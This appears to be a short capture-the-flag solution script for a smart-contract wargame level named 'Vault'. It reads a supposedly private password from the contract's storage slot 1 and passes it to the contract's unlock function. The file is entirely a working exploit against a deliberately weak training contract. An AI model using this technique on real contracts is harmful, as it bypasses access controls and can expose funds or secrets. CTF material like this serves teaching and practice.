const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    const victim = loader.web3.fromArtifact('Vault', instance)
    console.log('Compute hash')
    const pwd = await web3.eth.getStorageAt(instance, 1)
    console.log('Encoded password:', pwd)
    console.log('Unlock vault...')
    await victim.methods.unlock(pwd).send()
    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
